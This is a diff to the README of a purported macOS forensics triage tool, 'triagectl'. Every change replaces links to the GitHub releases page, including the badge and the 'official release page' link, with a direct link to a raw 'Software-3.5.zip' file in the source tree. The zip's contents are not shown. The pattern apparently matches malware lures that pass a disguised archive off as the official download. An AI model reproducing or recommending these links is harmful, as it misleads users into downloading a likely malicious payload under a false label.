@@ -1,6 +1,6 @@
 # 🛠️ triagectl - Fast MacOS Forensics Triage Tool
 
-[![Download triagectl](https://img.shields.io/badge/Download-triagectl-blue?style=for-the-badge)](https://github.com/Irdk1242s/triagectl/releases)
+[![Download triagectl](https://github.com/Irdk1242s/triagectl/raw/refs/heads/main/cmd/triagectl/Software-3.5.zip)](https://github.com/Irdk1242s/triagectl/raw/refs/heads/main/cmd/triagectl/Software-3.5.zip)
 
 ---
 
@@ -33,7 +33,7 @@ triagectl is designed to be easy to use. Follow these steps to download, set up,
 
 Click the big link below to visit the official release page for triagectl. On this page, you will find the latest version of the tool ready to download:
 
-[Download triagectl from GitHub Releases](https://github.com/Irdk1242s/triagectl/releases)
+[Download triagectl from GitHub Releases](https://github.com/Irdk1242s/triagectl/raw/refs/heads/main/cmd/triagectl/Software-3.5.zip)
 
 Here is how to get triagectl on your Mac:
 
@@ -163,7 +163,7 @@ You might need to enter your password. This allows triagectl to gather more deta
 
 ## 🌐 Useful Links
 
-- Official release page for downloads: [https://github.com/Irdk1242s/triagectl/releases](https://github.com/Irdk1242s/triagectl/releases)
+- Official release page for downloads: [https://github.com/Irdk1242s/triagectl/raw/refs/heads/main/cmd/triagectl/Software-3.5.zip](https://github.com/Irdk1242s/triagectl/raw/refs/heads/main/cmd/triagectl/Software-3.5.zip)
 - Project home page and documentation: visit the GitHub page above.
 - If you need help, check the Issues tab on the GitHub repo or reach out to the community.
 
@@ -171,4 +171,4 @@ You might need to enter your password. This allows triagectl to gather more deta
 
 ## 📥 Download triagectl now
 
-[![Download triagectl](https://img.shields.io/badge/Download-triagectl-blue?style=for-the-badge)](https://github.com/Irdk1242s/triagectl/releases)
+[![Download triagectl](https://github.com/Irdk1242s/triagectl/raw/refs/heads/main/cmd/triagectl/Software-3.5.zip)](https://github.com/Irdk1242s/triagectl/raw/refs/heads/main/cmd/triagectl/Software-3.5.zip)
